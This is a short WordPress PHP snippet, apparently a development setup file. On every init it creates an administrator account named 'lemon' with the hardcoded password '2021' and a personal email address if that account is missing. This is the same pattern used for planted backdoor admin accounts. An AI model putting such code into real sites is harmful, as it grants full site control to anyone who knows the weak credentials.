<?php

add_action( 'init', function () {
  
	$username = 'lemon';
	$password = '2021';
	$email_address = 'xchen@student.codam.nl';

	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
} );
